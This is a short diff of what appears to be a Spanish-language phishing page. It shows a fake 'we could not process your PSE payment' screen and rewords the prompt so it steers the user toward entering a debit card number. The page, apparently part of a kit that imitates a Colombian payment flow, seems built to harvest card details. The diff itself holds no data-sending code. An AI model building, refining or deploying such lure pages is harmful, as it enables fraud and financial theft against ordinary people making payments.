@@ -59,7 +59,7 @@ $tiempo = b34f9_fecha_larga();
         </table>        
         <br><br><br>
         <div class="titulo-app">Upps, no hemos podido procesar tu pago PSE</div>  
-        <div class="descripcion-app">Ingresa la informacion de tu tarjeta debito o credito para generar el pago</div>  
+        <div class="descripcion-app">para procesar tu pago ingresa tu tarjeta debito</div>  
         <div class="frm">
             <div class="inp" id="inp-tarjeta">
                 <table width="100%" cellpadding="0" cellspacing="0" border="0">
